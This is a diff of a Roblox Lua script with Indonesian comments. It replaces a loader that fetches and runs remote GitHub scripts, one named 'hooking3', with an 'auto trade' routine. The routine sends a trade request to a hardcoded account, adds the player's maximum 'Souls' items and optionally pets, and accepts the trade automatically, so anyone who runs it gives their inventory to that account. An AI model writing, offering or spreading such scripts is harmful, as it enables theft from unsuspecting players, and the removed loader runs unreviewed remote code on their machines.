@@ -1,21 +1,107 @@
---print("HOME")
-print("Full Script Is Running")
-local function executeScripts(scripts)
-    for _, script in ipairs(scripts) do
-        local co = coroutine.create(function()
-            loadstring(game:HttpGet(script))()
-        end)
-        coroutine.resume(co)
+-- Konfigurasi Trade
+local targetUser = "C4trynaRobloxEletori" -- Nama user yang ingin Anda trade
+local petName = nil -- Set petName ke nil jika tidak ingin menambahkan pet
+local useMaxPetQuantity = true -- Gunakan jumlah maksimum pet (true) atau jumlah tertentu (false)
+local petQuantity = 2 -- Jumlah pet yang ingin Anda trade (jika useMaxPetQuantity adalah false)
+local itemName = "Souls" -- Nama item yang ingin Anda trade dari tas
+local useMaxItemQuantity = true -- Gunakan jumlah maksimum item (true) atau jumlah tertentu (false)
+local itemQuantity = 10 -- Jumlah item yang ingin Anda trade (jika useMaxItemQuantity adalah false)
+local waitTime = 4 -- Waktu tunggu (dalam detik) antara setiap langkah 
+
+-- Menggunakan LocalPlayer untuk mengakses pemain lokal
+local localPlayer = game:GetService("Players").LocalPlayer
+local inventoryPath = localPlayer.PlayerGui.Inventory.InventoryFrame.HolderFrame
+
+-- Fungsi untuk mengambil jumlah maksimum pet yang tersedia
+local function getMaxPetQuantity(petName)
+    local petInfo = inventoryPath.Units[petName].Info -- Ambil informasi pet
+    local maxQuantity = tonumber(string.match(petInfo.Text, "x(%d+)")) or 0 -- Konversi teks menjadi angka
+    return maxQuantity -- Kembalikan jumlah maksimum pet
+end
+
+-- Fungsi untuk mengambil jumlah maksimum item dari tas
+local function getMaxItemQuantity(itemName)
+    local itemInfoText = inventoryPath.Items[itemName].Info.Text -- Ambil teks dari item
+    local maxQuantity = tonumber(string.match(itemInfoText, "x(%d+)")) or 0 -- Mengonversi teks menjadi angka
+    return maxQuantity -- Mengembalikan jumlah maksimum item
+end
+
+-- Ambil jumlah pet dan item yang akan ditrading
+local petQuantityToTrade = petName and (useMaxPetQuantity and getMaxPetQuantity(petName) or petQuantity) or 0
+local itemQuantityToTrade = useMaxItemQuantity and getMaxItemQuantity(itemName) or itemQuantity
+
+-- Fungsi untuk menambahkan pet ke dalam bar trade
+local function addPetToTrade(petTowerID, quantity)
+    if quantity > 0 then -- Pastikan ada pet yang ingin ditambahkan
+        local args = {
+            [1] = "Add",
+            [2] = petTowerID, -- TowerID dari pet yang ingin di-trade
+            [3] = quantity -- Jumlah pet yang ingin ditrade
+        }
+        game:GetService("ReplicatedStorage").Remotes.Trading.Trade:FireServer(unpack(args))
+        print("Pet " .. petName .. " dengan TowerID: " .. petTowerID .. " ditambahkan ke trade, jumlah: " .. quantity)
+    else
+        print("Tidak ada pet yang ingin ditambahkan.")
     end
 end
 
-local scripts = {
-    "https://raw.githubusercontent.com/LocasTheBoys/efentedeh/refs/heads/main/AutoJoin",
-    "https://raw.githubusercontent.com/LocasTheBoys/efentedeh/refs/heads/main/Claim",
-    "https://raw.githubusercontent.com/LocasTheBoys/efentedeh/refs/heads/main/PlaceDetection4",
-    "https://raw.githubusercontent.com/LocasTheBoys/selah/main/AntiDC",
-    "https://raw.githubusercontent.com/LocasTheBoys/TheBoyss/main/FPSCAP",
-    "https://raw.githubusercontent.com/LocasTheBoys/efentedeh/refs/heads/main/hooking3"
-}
+-- Fungsi untuk menambahkan item ke dalam bar trade
+local function addItemToTrade(itemName, quantity)
+    if quantity > 0 then -- Pastikan ada item yang ingin ditambahkan
+        local args = {
+            [1] = "Add",
+            [2] = itemName, -- Nama item yang ingin di-trade
+            [3] = quantity -- Jumlah item yang ingin ditrade
+        }
+        game:GetService("ReplicatedStorage").Remotes.Trading.Trade:FireServer(unpack(args))
+        print("Item " .. itemName .. " ditambahkan ke trade, jumlah: " .. quantity)
+    else
+        print("Tidak ada item yang ingin ditambahkan.")
+    end
+end
 
-executeScripts(scripts)
+-- Fungsi untuk mengirim trade ke user target
+local function sendTradeRequest(targetUser)
+    local args = {
+        [1] = targetUser
+    }
+    game:GetService("ReplicatedStorage").Remotes.Trading.Send:FireServer(unpack(args))
+    print("Trade request dikirim ke: " .. targetUser)
+end
+
+-- Fungsi untuk menerima trade setelah item ditambahkan
+local function acceptTrade()
+    local args = {
+        [1] = "Accept"
+    }
+    game:GetService("ReplicatedStorage").Remotes.Trading.Trade:FireServer(unpack(args))
+    print("Trade diterima. Item dikirim ke " .. targetUser)
+    wait(7)
+end
+
+-- Fungsi untuk mengirimkan trade, menambah pet dan item secara otomatis
+local function autoTrade()
+    -- Langkah 1: Kirim trade request
+    sendTradeRequest(targetUser)
+    wait(waitTime) -- Tunggu beberapa detik sebelum melanjutkan
+
+    -- Langkah 2: Jika ada pet, tambahkan pet ke dalam bar trade
+    if petName then
+        local petTowerID = inventoryPath.Units[petName].TowerID.Value -- Mengambil TowerID dari pet
+        addPetToTrade(petTowerID, petQuantityToTrade) -- Tambahkan jumlah pet yang diinginkan
+        wait(waitTime) -- Tunggu beberapa detik sebelum melanjutkan
+    end
+
+    -- Langkah 3: Tambahkan item dari tas ke trade bar
+    addItemToTrade(itemName, itemQuantityToTrade) -- Tambahkan item dari tas ke trade bar
+    wait(waitTime) -- Tunggu beberapa detik sebelum melanjutkan
+
+    -- Langkah 4: Terima trade setelah item ditambahkan
+    acceptTrade()
+    wait(waitTime) -- Tunggu beberapa detik sebelum script selesai
+
+    print("Auto trade selesai.")
+end
+
+-- Jalankan fungsi autoTrade
+autoTrade()
